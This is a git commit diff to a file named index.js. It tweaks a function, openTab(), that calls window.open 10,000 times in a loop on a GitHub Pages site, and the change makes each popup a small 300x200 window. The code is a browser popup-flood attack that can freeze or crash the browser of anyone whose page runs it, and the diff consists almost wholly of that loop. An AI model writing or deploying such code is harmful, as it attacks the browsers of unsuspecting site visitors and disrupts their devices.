b94c93d8c69ccaa929280d843439d7d64da802ac
Endberry <roseberrylouis1@gmail.com>
2024-11-11 09:08:37 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,7 +1,7 @@
 
 function openTab(){
   for (let i = 0; i < 10000; i++) {
-    window.open("https://endberry.github.io/cool_website/");
+    window.open("https://endberry.github.io/cool_website/", "", "width=300,height=200");
   };
 };
 
